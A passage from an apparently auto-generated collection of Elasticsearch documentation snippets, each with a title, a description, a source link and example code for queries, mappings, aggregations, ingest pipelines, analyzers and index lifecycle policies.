demonstrate this behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_diff.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW end_23 = TO_DATETIME(\"2023-12-31T23:59:59.999Z\"),\n  start_24 = TO_DATETIME(\"2024-01-01T00:00:00.000Z\"),\n    end_24 = TO_DATETIME(\"2024-12-31T23:59:59.999\")\n| EVAL end23_to_start24 = DATE_DIFF(\"year\", end_23, start_24)\n| EVAL end23_to_end24   = DATE_DIFF(\"year\", end_23, end_24)\n| EVAL start_to_end_24  = DATE_DIFF(\"year\", start_24, end_24)\n```\n\n----------------------------------------\n\nTITLE: Ordering by Count Ascending in Terms Aggregation\nDESCRIPTION: Example showing how to order terms by ascending document count (not recommended due to unbounded error).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"terms\": {\n        \"field\": \"genre\",\n        \"order\": { \"_count\": \"asc\" }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match with Field Boosting\nDESCRIPTION: This snippet illustrates how to boost the score of specific fields in a multi_match query. The \"subject\" field's score is multiplied by 3, while the \"message\" field's score remains unchanged.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\" : \"this is a test\",\n      \"fields\" : [ \"subject^3\", \"message\" ] <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping a Completion Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index mapping with a completion field named 'suggest'. The completion field type is specifically designed for fast completion suggestions in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/completion.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT music\n{\n  \"mappings\": {\n    \"properties\": {\n      \"suggest\": {\n        \"type\": \"completion\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Epoch Seconds for Date Fields in Elasticsearch\nDESCRIPTION: Example showing how to configure a date field to accept seconds-since-the-epoch format by including epoch_second in the format parameter. The example creates an index, inserts a document with a seconds-based timestamp, and queries it.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/date.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\":   \"date\",\n        \"format\": \"strict_date_optional_time||epoch_second\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/example?refresh\n{ \"date\": 1618321898 }\n\nPOST my-index-000001/_search\n{\n  \"fields\": [ {\"field\": \"date\"}],\n  \"_source\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Geo-polygon Query in Console\nDESCRIPTION: This snippet demonstrates executing a geo-polygon query in Elasticsearch which retrieves hits within a polygon defined by geo-coordinates. It requires Elasticsearch to handle geo-coordinates and polygon definitions. The query expects latitude and longitude values in GeoJSON format. It outputs query results matching the criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-polygon-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_polygon\": {\n          \"person.location\": {\n            \"points\": [\n              { \"lat\": 40, \"lon\": -70 },\n              { \"lat\": 30, \"lon\": -80 },\n              { \"lat\": 20, \"lon\": -90 }\n            ]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Grok Pattern Matching in Elasticsearch Pipeline\nDESCRIPTION: Example showing how to use Grok processor to extract IP address, HTTP method, request path, bytes, and duration from a log message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/grok-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"description\" : \"...\",\n    \"processors\": [\n      {\n        \"grok\": {\n          \"field\": \"message\",\n          \"patterns\": [\"%{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes:int} %{NUMBER:duration:double}\"]\n        }\n      }\n    ]\n  },\n  \"docs\":[\n    {\n      \"_source\": {\n        \"message\": \"55.3.244.1 GET /index.html 15824 0.043\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using nori_readingform Token Filter in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure an index with a custom analyzer using the nori_tokenizer and nori_readingform filter. It then shows how to use this analyzer to convert Hanja text to Hangul.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-readingform.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT nori_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"nori_tokenizer\",\n            \"filter\": [ \"nori_readingform\" ]\n          }\n        }\n      }\n    }\n  }\n}\n\nGET nori_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"鄕歌\"\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Source Filtering with Includes and Excludes in Elasticsearch\nDESCRIPTION: Example of using the _source parameter with includes and excludes properties for fine-grained control over which fields are returned in the search response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"_source\": {\n    \"includes\": [ \"obj1.*\", \"obj2.*\" ],\n    \"excludes\": [ \"*.description\" ]\n  },\n  \"query\": {\n    \"term\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: MATCH with Advanced Parameters in Elasticsearch SQL\nDESCRIPTION: Example showing how to customize match query behavior using additional parameters like operator, fuzziness, and minimum_should_match.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name, SCORE() FROM library WHERE MATCH(name, 'to the star', 'operator=OR;fuzziness=AUTO:1,5;minimum_should_match=1')\nORDER BY SCORE() DESC LIMIT 2;\n\n     author      |                name                |    SCORE()\n-----------------+------------------------------------+---------------\nDouglas Adams    |The Hitchhiker's Guide to the Galaxy|3.1756816\nPeter F. Hamilton|Pandora's Star                      |3.0997515\n```\n\n----------------------------------------\n\nTITLE: Executing Basic Fuzzy Search Elasticsearch Console\nDESCRIPTION: Demonstrates a basic fuzzy search query in Elasticsearch, searching for documents with terms similar to 'ki' in the user.id field. No additional parameters are set, making it a simple demonstration of fuzzy queries with default settings. Required to have a 'user.id' field populated in the Elasticsearch index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-fuzzy-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"fuzzy\": {\n      \"user.id\": {\n        \"value\": \"ki\"\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: DATE_DIFF Example: Difference in Quarters\nDESCRIPTION: Illustrates calculating the difference between two dates in quarters using DATE_DIFF. The example shows how to use DATE_DIFF to compute the number of quarters between two specified dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_31\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_DIFF('qq', '2019-09-04'::date, '2025-04-25'::date) AS \\\"diffInQuarters\\\";\\n\\n      diffInQuarters\n------------------------\n23\"\n```\n\n----------------------------------------\n\nTITLE: Querying Airports within a Polygon using ESQL and Geospatial Functions\nDESCRIPTION: This ESQL query filters airports based on their location intersecting with a specified polygon. It uses the ST_INTERSECTS function to check if the airport's location is within the polygon defined by TO_GEOSHAPE. This query is useful for finding airports within a specific geographical area.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_intersects.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE ST_INTERSECTS(location, TO_GEOSHAPE(\"POLYGON((42 14, 43 14, 43 15, 42 15, 42 14))\"))\n```\n\n----------------------------------------\n\nTITLE: Basic Searchable Snapshot ILM Policy Configuration\nDESCRIPTION: Demonstrates a basic ILM policy configuration that creates a searchable snapshot in the cold phase using a specified backup repository.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-searchable-snapshot.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"cold\": {\n        \"actions\": {\n          \"searchable_snapshot\" : {\n            \"snapshot_repository\" : \"backing_repo\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Rollover Policy with Shard Size Conditions in Elasticsearch\nDESCRIPTION: This snippet defines an ILM policy that rolls over an index when the primary shard size reaches 50GB or the index is 30 days old, but only if a primary shard is at least 1GB. This prevents creating many small shards for low-volume indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_primary_shard_size\": \"50gb\",\n            \"max_age\": \"30d\",\n            \"min_primary_shard_size\": \"1gb\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Nested Document Mapping in Elasticsearch\nDESCRIPTION: Example of setting up mappings for nested documents with a resellers array containing nested properties for reseller name and price.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-nested-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /products\n{\n  \"mappings\": {\n    \"properties\": {\n      \"resellers\": {\n        \"type\": \"nested\",\n        \"properties\": {\n          \"reseller\": {\n            \"type\": \"keyword\"\n          },\n          \"price\": {\n            \"type\": \"double\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Multi-Match Query in Elasticsearch ESQL\nDESCRIPTION: This snippet demonstrates how to use the MULTI_MATCH function in an ESQL query to search for 'Faulkner' across the 'author' and 'description' fields of a 'books' index. It limits the results to 5 entries, sorts by 'book_no', and only returns the 'book_no' and 'author' fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/multi_match.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE MULTI_MATCH(\"Faulkner\", author, description)\n| KEEP book_no, author\n| SORT book_no\n| LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Turkish Analyzer in Elasticsearch\nDESCRIPTION: This snippet sets up a custom analyzer for processing Turkish language text in Elasticsearch. It incorporates specific filters that handle lowercase conversion, stopwords, and stemming for Turkish, with requirements for Elasticsearch and proper language support configurations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_28\n\nLANGUAGE: console\nCODE:\n```\nPUT /turkish_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"turkish_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_turkish_\" <1>\n        },\n        \"turkish_lowercase\": {\n          \"type\":       \"lowercase\",\n          \"language\":   \"turkish\"\n        },\n        \"turkish_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"örnek\"] <2>\n        },\n        \"turkish_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"turkish\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_turkish\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"apostrophe\",\n            \"turkish_lowercase\",\n            \"turkish_stop\",\n            \"turkish_keywords\",\n            \"turkish_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Trimming and Formatting Strings with RTRIM and CONCAT in ESQL\nDESCRIPTION: This ESQL query demonstrates the use of RTRIM to remove trailing whitespace from 'message' and 'color' fields, followed by CONCAT to add single quotes around the trimmed values. It showcases string manipulation and formatting in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/rtrim.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW message = \"   some text  \",  color = \" red \"\n| EVAL message = RTRIM(message)\n| EVAL color = RTRIM(color)\n| EVAL message = CONCAT(\"'\", message, \"'\")\n| EVAL color = CONCAT(\"'\", color, \"'\")\n```\n\n----------------------------------------\n\nTITLE: Performing a Search in Elasticsearch using Java API Client\nDESCRIPTION: This snippet shows how to perform a search operation in Elasticsearch using the Java API Client. It constructs a search query and executes it, then processes the search results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/ent-search/licenses/slf4j-api-NOTICE.txt#2025-04-22_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nSearchResponse<Product> response = client.search(s -> s\n    .index(\"products\")\n    .query(q -> q\n        .term(t -> t\n            .field(\"name\")\n            .value(v -> v.stringValue(\"bike\"))\n        )\n    ),\n    Product.class\n);\n\nfor (Hit<Product> hit: response.hits().hits()) {\n    processProduct(hit.source());\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring and Querying Hierarchical Nested Object Fields with Inner Hits in Elasticsearch\nDESCRIPTION: This example demonstrates how to set up a hierarchical nested structure with multiple levels (comments containing votes), index a document with this structure, and query it using nested paths with inner hits. The query targets a specific voter in the nested votes field and returns the matching nested objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT test\n{\n  \"mappings\": {\n    \"properties\": {\n      \"comments\": {\n        \"type\": \"nested\",\n        \"properties\": {\n          \"votes\": {\n            \"type\": \"nested\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT test/_doc/1?refresh\n{\n  \"title\": \"Test title\",\n  \"comments\": [\n    {\n      \"author\": \"kimchy\",\n      \"text\": \"comment text\",\n      \"votes\": []\n    },\n    {\n      \"author\": \"nik9000\",\n      \"text\": \"words words words\",\n      \"votes\": [\n        {\"value\": 1 , \"voter\": \"kimchy\"},\n        {\"value\": -1, \"voter\": \"other\"}\n      ]\n    }\n  ]\n}\n\nPOST test/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"comments.votes\",\n        \"query\": {\n          \"match\": {\n            \"comments.votes.voter\": \"kimchy\"\n          }\n        },\n        \"inner_hits\" : {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Query Ruleset in Elasticsearch\nDESCRIPTION: Example of creating a query ruleset with two rules - one for pinning specific document IDs and another for excluding documents, based on different metadata criteria.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/searching-with-query-rules.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT /_query_rules/my-ruleset\n{\n  \"rules\": [\n    {\n      \"rule_id\": \"rule1\",\n      \"type\": \"pinned\",\n      \"criteria\": [\n        {\n          \"type\": \"fuzzy\",\n          \"metadata\": \"query_string\",\n          \"values\": [ \"puggles\", \"pugs\" ]\n        },\n        {\n          \"type\": \"exact\",\n          \"metadata\": \"user_country\",\n          \"values\": [ \"us\" ]\n        }\n      ],\n      \"actions\": {\n        \"ids\": [\n          \"id1\",\n          \"id2\"\n        ]\n      }\n    },\n    {\n      \"rule_id\": \"rule2\",\n      \"type\": \"exclude\",\n      \"criteria\": [\n        {\n          \"type\": \"contains\",\n          \"metadata\": \"query_string\",\n          \"values\": [ \"beagles\" ]\n        }\n      ],\n      \"actions\": {\n        \"docs\": [\n          {\n            \"_index\": \"my-index-000001\",\n            \"_id\": \"id3\"\n          },\n          {\n            \"_index\": \"my-index-000002\",\n            \"_id\": \"id4\"\n          }\n        ]\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Avg Aggregation in Elasticsearch\nDESCRIPTION: Demonstrates how to use the Avg aggregation to compute the average grade over all documents in an index named 'exams'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-avg-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_search?size=0\n{\n  \"aggs\": {\n    \"avg_grade\": { \"avg\": { \"field\": \"grade\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Monthly Sales Sum Bucket Aggregation Request\nDESCRIPTION: Example request showing how to calculate the sum of all total monthly sales buckets using date histogram and sum bucket aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-sum-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"sum_monthly_sales\": {\n      \"sum_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Multiple Fields with Remove Processor in Elasticsearch\nDESCRIPTION: Configuration example that shows how to remove multiple fields ('user_agent' and 'url') from documents using an array in the 'field' parameter of the Remove processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/remove-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"remove\": {\n    \"field\": [\"user_agent\", \"url\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Levels of Parent-Child Relations in Elasticsearch\nDESCRIPTION: This example demonstrates how to set up multiple levels of parent-child relationships in an Elasticsearch join field. It creates a hierarchy with 'question' as the top-level parent, 'answer' and 'comment' as its children, and 'vote' as a child of 'answer'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_join_field\": {\n        \"type\": \"join\",\n        \"relations\": {\n          \"question\": [\"answer\", \"comment\"],  <1>\n          \"answer\": \"vote\" <2>\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining English Stop Words\nDESCRIPTION: Defines the English stop words for Elasticsearch text analysis, referring to the Lucene source file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_15\n\nLANGUAGE: markdown\nCODE:\n```\n`_english_`\n:   [English stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/java/org/apache/lucene/analysis/en/EnglishAnalyzer.java#L48)\n```\n\n----------------------------------------\n\nTITLE: Referencing Metrics with Dots in Names\nDESCRIPTION: Example showing the syntax for referencing metrics that have dots in their names, such as percentiles (e.g., 99.9th percentile).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n\"buckets_path\": \"my_percentile[99.9]\"\n```\n\n----------------------------------------\n\nTITLE: Executing Percolate Query\nDESCRIPTION: Example of executing a percolate query against stored queries via an alias.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /queries/_search\n{\n  \"query\": {\n    \"percolate\" : {\n      \"field\" : \"query\",\n      \"document\" : {\n        \"body\" : \"fox jumps over the lazy dog\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT MultiPolygon in Elasticsearch\nDESCRIPTION: Example of indexing a WKT (Well-Known Text) MultiPolygon in Elasticsearch. The example shows two polygons in string format, with the second polygon containing a hole.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/shape.md#2025-04-21_snippet_15\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTIPOLYGON (((1002.0 200.0, 1003.0 200.0, 1003.0 300.0, 1002.0 300.0, 102.0 200.0)), ((1000.0 100.0, 1001.0 100.0, 1001.0 100.0, 1000.0 100.0, 1000.0 100.0), (1000.2 100.2, 1000.8 100.2, 1000.8 100.8, 1000.2 100.8, 1000.2 100.2)))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Null Values in ESQL Query\nDESCRIPTION: An ESQL query that filters employee records where the birth_date field is null. The query returns only employees with null birth dates, showing their first and last names in the result set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/examples/is_null.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE birth_date IS NULL\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents with Multiple Analyzers in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to index two documents into the index with multiple analyzers, using slightly different text content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{ \"text\": \"quick brown fox\" }\n\nPUT my-index-000001/_doc/2\n{ \"text\": \"quick brown foxes\" }\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Inputs for Inference Processor in Elasticsearch\nDESCRIPTION: Demonstrates how to configure an inference processor to process multiple input fields ('content' and 'title') and map their outputs to separate fields ('content_embedding' and 'title_embedding'). This allows processing multiple fields in a single inference operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/inference-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"inference\": {\n    \"model_id\": \"model_deployment_for_inference\",\n    \"input_output\": [\n        {\n            \"input_field\": \"content\",\n            \"output_field\": \"content_embedding\"\n        },\n        {\n            \"input_field\": \"title\",\n            \"output_field\": \"title_embedding\"\n        }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Histogram Data in Elasticsearch\nDESCRIPTION: Example API requests demonstrating how to store pre-aggregated histogram data for two different histograms, including values and counts arrays that define the histogram buckets and their frequencies.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/histogram.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"my_text\" : \"histogram_1\",\n  \"my_histogram\" : {\n      \"values\" : [0.1, 0.2, 0.3, 0.4, 0.5],\n      \"counts\" : [3, 7, 23, 12, 6]\n   }\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"my_text\" : \"histogram_2\",\n  \"my_histogram\" : {\n      \"values\" : [0.1, 0.25, 0.35, 0.4, 0.45, 0.5],\n      \"counts\" : [8, 17, 8, 7, 6, 2]\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Day-of-Week Aggregation Using Painless in Elasticsearch\nDESCRIPTION: Example showing how to use a terms aggregation with a Painless script to group messages by day of the week using the getDayOfWeekEnum method.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_29\n\nLANGUAGE: console\nCODE:\n```\nGET /messages/_search?pretty=true\n{\n  \"aggs\": {\n    \"day-of-week-count\": {\n      \"terms\": {\n        \"script\": \"return doc[\\\"datetime\\\"].value.getDayOfWeekEnum();\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PEM Key for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to specify the path to a PEM encoded file containing the private key for remote cluster client SSL. Cannot be used with keystore.path simultaneously.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_43\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.key\n```\n\n----------------------------------------\n\nTITLE: Connector Configuration YAML Example\nDESCRIPTION: This YAML snippet shows an example configuration block for connectors, including connector IDs, API keys, and service types. It demonstrates how to configure multiple connectors with individual or default API keys for Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-run-from-source.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n\"# ...\nconnectors:\n  - connector_id: <CONNECTOR-ID>\n    api_key: <API-KEY> # Scoped API key for this connector (optional). If not specified, the top-level `elasticsearch.api_key` value is used.\n    service_type: gmail # example\"\n```\n\n----------------------------------------\n\nTITLE: Filtering Active Employees with ESQL\nDESCRIPTION: ESQL query that selects specific employee fields (first_name, last_name, still_hired) and filters for currently employed staff. The query uses KEEP for column selection and WHERE clause for filtering based on employment status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/where.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, still_hired\n| WHERE still_hired == true\n```\n\n----------------------------------------\n\nTITLE: Defining Advanced Sync Rules with Glob Patterns - JavaScript\nDESCRIPTION: The JavaScript snippets demonstrate how to define advanced synchronization rules using glob patterns for indexing files and folders within a configured drive path in an Elasticsearch network drive connector. These rules specify patterns to identify target folders and exclude certain files. The JSON format is used, requiring an appropriate key setup by the connector with the 'drive_path' field at the start of each pattern.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-network-drive.md#2025-04-21_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"pattern\": \"Folder-shared/a/mock/**\"\n  },\n  {\n    \"pattern\": \"Folder-shared/b/alpha/**\"\n  }\n]\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"pattern\": \"Folder-shared/a/b/test\"\n  }\n]\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"pattern\": \"Folder-shared/org/*/all-tests/test[135]\"\n  }\n]\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n[\n  {\n    \"pattern\": \"Folder-shared/**/all-tests/test[!7]\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Custom Date Format in Elasticsearch\nDESCRIPTION: Example of creating an Elasticsearch index with a custom date format mapping using the yyyy-MM-dd pattern. This demonstrates how to configure a date field with a specific format in the index mappings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-date-format.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"date\": {\n        \"type\":   \"date\",\n        \"format\": \"yyyy-MM-dd\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for ESQL Function Test Case in Markdown\nDESCRIPTION: This code snippet defines the parameters for an ESQL function test case. It specifies a single parameter 'field' which is described as a multivalue expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_dedupe.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Function Parameters in Asciidoc\nDESCRIPTION: This snippet defines the parameters for an ESQL function test case using Asciidoc syntax. It specifies a 'field' parameter as a multivalue expression.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/mv_first.md#2025-04-21_snippet_0\n\nLANGUAGE: asciidoc\nCODE:\n```\n**Parameters**\n\n`field`\n:   Multivalue expression.\n```\n\n----------------------------------------\n\nTITLE: Basic LIMIT Clause Usage\nDESCRIPTION: Shows how to limit result set to a single record.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_29\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name, last_name, emp_no FROM emp LIMIT 1;\n```\n\n----------------------------------------\n\nTITLE: Initiating Data 